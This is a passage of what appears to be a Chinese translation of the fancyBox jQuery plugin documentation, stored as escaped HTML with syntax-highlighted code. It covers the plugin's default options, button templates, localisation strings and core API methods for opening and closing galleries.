\u003cspan class=\"hljs-comment\"\u003e// 自定义的布局的 class 值\u003c/span\u003e\n    baseClass : \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 布局的模板\u003c/span\u003e\n    baseTpl\u0009:\n        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-container\" role=\"dialog\" tabindex=\"-1\"\u0026gt;'\u003c/span\u003e +\n            \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-bg\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e +\n            \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-inner\"\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-infobar\"\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;span data-fancybox-index\u0026gt;\u0026lt;/span\u0026gt;\u0026amp;nbsp;/\u0026amp;nbsp;\u0026lt;span data-fancybox-count\u0026gt;\u0026lt;/span\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/div\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-toolbar\"\u0026gt;{{buttons}}\u0026lt;/div\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-navigation\"\u0026gt;{{arrows}}\u0026lt;/div\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-stage\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-caption-wrap\"\u0026gt;\u0026lt;div class=\"fancybox-caption\"\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e +\n            \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/div\u0026gt;'\u003c/span\u003e +\n        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 加载中时的模板\u003c/span\u003e\n    spinnerTpl : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-loading\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 错误时的模板\u003c/span\u003e\n    errorTpl : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"fancybox-error\"\u0026gt;\u0026lt;p\u0026gt;{{ERROR}}\u0026lt;p\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-attr\"\u003ebtnTpl\u003c/span\u003e : {\n\n        \u003cspan class=\"hljs-attr\"\u003edownload\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;a download data-fancybox-download class=\"fancybox-button fancybox-button--download\" title=\"{{DOWNLOAD}}\"\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;svg viewBox=\"0 0 40 40\"\u0026gt;'\u003c/span\u003e +\n                        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;path d=\"M20,23 L20,8 L20,23 L13,16 L20,23 L27,16 L20,23 M26,28 L13,28 L27,28 L14,28\" /\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/svg\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/a\u0026gt;'\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003ezoom\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;button data-fancybox-zoom class=\"fancybox-button fancybox-button--zoom\" title=\"{{ZOOM}}\"\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;svg viewBox=\"0 0 40 40\"\u0026gt;'\u003c/span\u003e +\n                        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;path d=\"M 18,17 m-8,0 a 8,8 0 1,0 16,0 a 8,8 0 1,0 -16,0 M25,23 L31,29 L25,23\" /\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/svg\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/button\u0026gt;'\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003eclose\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;button data-fancybox-close class=\"fancybox-button fancybox-button--close\" title=\"{{CLOSE}}\"\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;svg viewBox=\"0 0 40 40\"\u0026gt;'\u003c/span\u003e +\n                        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;path d=\"M10,10 L30,30 M30,10 L10,30\" /\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/svg\u0026gt;'\u003c/span\u003e +\n                \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/button\u0026gt;'\u003c/span\u003e,\n\n      \u0009\u003cspan class=\"hljs-comment\"\u003e// 如果'smallBtn'没有设置为 false，默认关闭按钮将会被放置在你的 html/inline/ajax 内容中\u003c/span\u003e\n        smallBtn   : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;button data-fancybox-close class=\"fancybox-close-small\" title=\"{{CLOSE}}\"\u0026gt;\u0026lt;/button\u0026gt;'\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-comment\"\u003e// 箭头\u003c/span\u003e\n        arrowLeft : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;button data-fancybox-prev class=\"fancybox-button fancybox-button--arrow_left\" title=\"{{PREV}}\"\u0026gt;'\u003c/span\u003e +\n                        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;svg viewBox=\"0 0 40 40\"\u0026gt;'\u003c/span\u003e +\n                          \u003cspan class=\"hljs-string\"\u003e'\u0026lt;path d=\"M10,20 L30,20 L10,20 L18,28 L10,20 L18,12 L10,20\"\u0026gt;\u0026lt;/path\u0026gt;'\u003c/span\u003e +\n                        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/svg\u0026gt;'\u003c/span\u003e +\n                      \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/button\u0026gt;'\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003earrowRight\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'\u0026lt;button data-fancybox-next class=\"fancybox-button fancybox-button--arrow_right\" title=\"{{NEXT}}\"\u0026gt;'\u003c/span\u003e +\n                      \u003cspan class=\"hljs-string\"\u003e'\u0026lt;svg viewBox=\"0 0 40 40\"\u0026gt;'\u003c/span\u003e +\n                        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;path d=\"M30,20 L10,20 L30,20 L22,28 L30,20 L22,12 L30,20\"\u0026gt;\u0026lt;/path\u0026gt;'\u003c/span\u003e +\n                      \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/svg\u0026gt;'\u003c/span\u003e +\n                    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/button\u0026gt;'\u003c/span\u003e\n    },\n\n    \u003cspan class=\"hljs-comment\"\u003e// 模态框放置在哪个节点中\u003c/span\u003e\n    parentEl : \u003cspan class=\"hljs-string\"\u003e'body'\u003c/span\u003e,\n\n\n    \u003cspan class=\"hljs-comment\"\u003e// 焦点处理\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// ==============\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e// 打开后焦点在第一个支持焦点的元素上\u003c/span\u003e\n    autoFocus : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 关闭后焦点回到 active 的元素上\u003c/span\u003e\n    backFocus : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 不让用户焦点放在模态框外的内容中\u003c/span\u003e\n    trapFocus : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\n\n    \u003cspan class=\"hljs-comment\"\u003e// 模态框配置\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// =======================\u003c/span\u003e\n\n    fullScreen : {\n        \u003cspan class=\"hljs-attr\"\u003eautoStart\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    },\n\n    \u003cspan class=\"hljs-comment\"\u003e// 设置 `touch: false` 来禁止拖拽/手指滑动\u003c/span\u003e\n    touch : {\n        \u003cspan class=\"hljs-attr\"\u003evertical\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,  \u003cspan class=\"hljs-comment\"\u003e// 允许垂直方向拖拽\u003c/span\u003e\n        momentum : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e   \u003cspan class=\"hljs-comment\"\u003e// Continue movement after releasing mouse/touch when panning\u003c/span\u003e\n    },\n\n    \u003cspan class=\"hljs-comment\"\u003e// 手动初始化时的 hash 值,\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 设为 `false` 不改变 hash \u003c/span\u003e\n    hash : \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 自定义或者添加媒体类型\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 例如:\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e/*\n    media : {\n        youtube : {\n            params : {\n                autoplay : 0\n            }\n        }\n    }\n    */\u003c/span\u003e\n    media : {},\n\n    \u003cspan class=\"hljs-attr\"\u003eslideShow\u003c/span\u003e : {\n        \u003cspan class=\"hljs-attr\"\u003eautoStart\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003espeed\u003c/span\u003e     : \u003cspan class=\"hljs-number\"\u003e4000\u003c/span\u003e\n    },\n\n    \u003cspan class=\"hljs-attr\"\u003ethumbs\u003c/span\u003e : {\n        \u003cspan class=\"hljs-attr\"\u003eautoStart\u003c/span\u003e   : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,                  \u003cspan class=\"hljs-comment\"\u003e// 打开的时候展示缩略图\u003c/span\u003e\n        hideOnClose : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,                   \u003cspan class=\"hljs-comment\"\u003e// 关闭动画开始时隐藏缩略图轮廓\u003c/span\u003e\n        parentEl    : \u003cspan class=\"hljs-string\"\u003e'.fancybox-container'\u003c/span\u003e,  \u003cspan class=\"hljs-comment\"\u003e// Container is injected into this element\u003c/span\u003e\n        axis        : \u003cspan class=\"hljs-string\"\u003e'y'\u003c/span\u003e                     \u003cspan class=\"hljs-comment\"\u003e// 垂直 (y) or 水平 (x) 滚动\u003c/span\u003e\n    },\n\n    \u003cspan class=\"hljs-comment\"\u003e// 使用鼠标滚轮来浏览相册\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 设为 'auto' - 只对图片启用\u003c/span\u003e\n    wheel : \u003cspan class=\"hljs-string\"\u003e'auto'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 毁掉函数\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//==========\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e// 更多信息请查看 API\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 例如:\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e/*\n        afterShow: function( instance, current ) {\n             console.info( 'Clicked element:' );\n             console.info( current.opts.$orig );\n        }\n    */\u003c/span\u003e\n\n    onInit       : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 实例初始化完成\u003c/span\u003e\n\n    beforeLoad   : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 侧栏的内容正在被加载\u003c/span\u003e\n    afterLoad    : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 侧栏的内容加载完成后\u003c/span\u003e\n\n    beforeShow   : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 打开动画开始前\u003c/span\u003e\n    afterShow    : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 内容加载完成，进行动画的时候\u003c/span\u003e\n\n    beforeClose  : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 实例准备关闭的时候，返回 false 值取消关闭\u003c/span\u003e\n    afterClose   : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 实例关闭后\u003c/span\u003e\n\n    onActivate   : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 实例激活的时候\u003c/span\u003e\n    onDeactivate : $.noop,  \u003cspan class=\"hljs-comment\"\u003e// 其他实例被激活的时候\u003c/span\u003e\n\n\n    \u003cspan class=\"hljs-comment\"\u003e// 交互\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// ===========\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e// 使用一下选项自定义用户单击双击等事件\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 每个选项可以是字符串，或者有返回值的方法\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 可用的值:\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"close\"           - close instance\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"next\"            - move to next gallery item\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"nextOrClose\"     - move to next gallery item or close if gallery has only one item\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"toggleControls\"  - show/hide controls\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   \"zoom\"            - zoom image (if loaded)\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//   false             - do nothing\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e// 内容被点击\u003c/span\u003e\n    clickContent : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e current, event \u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e current.type === \u003cspan class=\"hljs-string\"\u003e'image'\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'zoom'\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n    },\n\n    \u003cspan class=\"hljs-comment\"\u003e// 侧边栏被点击\u003c/span\u003e\n    clickSlide : \u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 点击模态框外的北京时\u003c/span\u003e\n    clickOutside : \u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e,\n\n    \u003cspan class=\"hljs-comment\"\u003e// 同之前的两个一样，只是是双击的时候\u003c/span\u003e\n    dblclickContent : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003edblclickSlide\u003c/span\u003e   : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003edblclickOutside\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\n\n    \u003cspan class=\"hljs-comment\"\u003e// 移动端事件\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// =============================================\u003c/span\u003e\n\n    mobile : {\n        \u003cspan class=\"hljs-attr\"\u003eidleTime\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003emargin\u003c/span\u003e   : \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003eclickContent\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e current, event \u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e current.type === \u003cspan class=\"hljs-string\"\u003e'image'\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'toggleControls'\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n        },\n        \u003cspan class=\"hljs-attr\"\u003eclickSlide\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e current, event \u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e current.type === \u003cspan class=\"hljs-string\"\u003e'image'\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'toggleControls'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e;\n        },\n        \u003cspan class=\"hljs-attr\"\u003edblclickContent\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e current, event \u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e current.type === \u003cspan class=\"hljs-string\"\u003e'image'\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'zoom'\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n        },\n        \u003cspan class=\"hljs-attr\"\u003edblclickSlide\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e current, event \u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e current.type === \u003cspan class=\"hljs-string\"\u003e'image'\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'zoom'\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n        }\n    },\n\n\n    \u003cspan class=\"hljs-comment\"\u003e// 国际化\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// ============\u003c/span\u003e\n\n    lang : \u003cspan class=\"hljs-string\"\u003e'en'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ei18n\u003c/span\u003e : {\n        \u003cspan class=\"hljs-string\"\u003e'en'\u003c/span\u003e : {\n            \u003cspan class=\"hljs-attr\"\u003eCLOSE\u003c/span\u003e       : \u003cspan class=\"hljs-string\"\u003e'Close'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eNEXT\u003c/span\u003e        : \u003cspan class=\"hljs-string\"\u003e'Next'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ePREV\u003c/span\u003e        : \u003cspan class=\"hljs-string\"\u003e'Previous'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eERROR\u003c/span\u003e       : \u003cspan class=\"hljs-string\"\u003e'The requested content cannot be loaded. \u0026lt;br/\u0026gt; Please try again later.'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ePLAY_START\u003c/span\u003e  : \u003cspan class=\"hljs-string\"\u003e'Start slideshow'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ePLAY_STOP\u003c/span\u003e   : \u003cspan class=\"hljs-string\"\u003e'Pause slideshow'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eFULL_SCREEN\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'Full screen'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eTHUMBS\u003c/span\u003e      : \u003cspan class=\"hljs-string\"\u003e'Thumbnails'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eDOWNLOAD\u003c/span\u003e    : \u003cspan class=\"hljs-string\"\u003e'Download'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eSHARE\u003c/span\u003e       : \u003cspan class=\"hljs-string\"\u003e'Share'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eZOOM\u003c/span\u003e        : \u003cspan class=\"hljs-string\"\u003e'Zoom'\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e'de'\u003c/span\u003e : {\n            \u003cspan class=\"hljs-attr\"\u003eCLOSE\u003c/span\u003e       : \u003cspan class=\"hljs-string\"\u003e'Schliessen'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eNEXT\u003c/span\u003e        : \u003cspan class=\"hljs-string\"\u003e'Weiter'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ePREV\u003c/span\u003e        : \u003cspan class=\"hljs-string\"\u003e'Zurück'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eERROR\u003c/span\u003e       : \u003cspan class=\"hljs-string\"\u003e'Die angeforderten Daten konnten nicht geladen werden. \u0026lt;br/\u0026gt; Bitte versuchen Sie es später nochmal.'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ePLAY_START\u003c/span\u003e  : \u003cspan class=\"hljs-string\"\u003e'Diaschau starten'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ePLAY_STOP\u003c/span\u003e   : \u003cspan class=\"hljs-string\"\u003e'Diaschau beenden'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eFULL_SCREEN\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'Vollbild'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eTHUMBS\u003c/span\u003e      : \u003cspan class=\"hljs-string\"\u003e'Vorschaubilder'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eDOWNLOAD\u003c/span\u003e    : \u003cspan class=\"hljs-string\"\u003e'Herunterladen'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eSHARE\u003c/span\u003e       : \u003cspan class=\"hljs-string\"\u003e'Teilen'\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003eZOOM\u003c/span\u003e        : \u003cspan class=\"hljs-string\"\u003e'Maßstab'\u003c/span\u003e\n        }\n    }\n\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过传入 \u003ccode\u003efancybox\u003c/code\u003e 方法一个对象来设置一个实例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-string\"\u003e\"[data-fancybox]\"\u003c/span\u003e).fancybox({\n\u0009\u003cspan class=\"hljs-attr\"\u003ethumbs\u003c/span\u003e : {\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003eautoStart\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u0009}\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以通过 \u003ccode\u003e$.fancybox.defaults\u003c/code\u003e 命名空间修改 fancyBox 的默认选项：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.defaults.animationEffect = \u003cspan class=\"hljs-string\"\u003e\"fade\"\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对于单独的元素可以通过 \u003ccode\u003edata-options\u003c/code\u003e 属性进行自定义。这个属性值要求JSON格式的对象：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-fancybox\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-options\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'{\"caption\" : \"My caption\", \"src\" : \"https://codepen.io/about/\", \"type\" : \"iframe\"}'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"javascript:;\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"btn\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009Open external page\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/zPBEww?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e7. API\u003c/h2\u003e\n\u003cp\u003eAPI 提供了一系列的方法来控制 fancyBox。这些方法帮助你扩展插件，整合到其他的 web 应用中。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e7.1 核心方法\u003c/h3\u003e\n\u003cp\u003e操作实例的核心方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 只关闭当前 active 状态或者所有的 fancyBox 实例\u003c/span\u003e\n$.fancybox.close( \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e );\n\n\u003cspan class=\"hljs-comment\"\u003e// 打开 fancyBox\u003c/span\u003e\n$.fancybox.open( items, opts, index );\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过 jQuery 将相册中的元素变为 jQuery 对象或者包含纯对象的数组，进行更多操作如创建定义点击事件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e $links = $(\u003cspan class=\"hljs-string\"\u003e'.fancybox'\u003c/span\u003e);\n\n$links.on(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\n\u0009$.fancybox.open( $links, {\n\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// 自定义内容\u003c/span\u003e\n\u0009}, $links.index( \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e ) );\n\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e手动创建一组对象时，组内元素应该遵循以下规则：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e{\n  \u0009\u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e  : \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// 资源\u003c/span\u003e\n\u0009type : \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// 类型: image|inline|ajax|iframe|html (optional)\u003c/span\u003e\n\u0009opts : {} \u003cspan class=\"hljs-comment\"\u003e// 选项 (optional)\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e下面是一个通过 JavaScrip t打开相册的例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.open([\n\u0009{\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e  : \u003cspan class=\"hljs-string\"\u003e'1_b.jpg'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003eopts\u003c/span\u003e : {\n\u0009\u0009\u0009\u003cspan class=\"hljs-attr\"\u003ecaption\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'First caption'\u003c/span\u003e\n\u0009\u0009}\n\u0009},\n\u0009{\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e  : \u003cspan class=\"hljs-string\"\u003e'2_b.jpg'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003eopts\u003c/span\u003e : {\n\u0009\u0009\u0009\u003cspan class=\"hljs-attr\"\u003ecaption\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'Second caption'\u003c/span\u003e\n\u0009\u0009}\n\u0009}\n], {\n\u0009\u003cspan class=\"hljs-attr\"\u003eloop\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/WXxZMv?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003efancyBox 